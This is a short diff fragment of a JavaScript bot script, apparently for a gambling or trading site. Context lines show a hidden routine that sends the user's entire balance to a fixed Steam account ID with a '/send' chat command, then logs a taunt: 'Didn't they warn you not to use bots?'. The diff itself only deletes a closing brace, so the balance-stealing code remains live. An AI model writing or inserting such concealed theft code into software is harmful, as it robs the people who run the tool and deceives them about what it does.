@@ -223,7 +223,6 @@ function Automated() {
         "msg": '/send 76561198138006602 ' + self.balance,
         "lang": LANG
     });
-}
 
         self.log('Didn\'t they warn you not to use bots?');
 
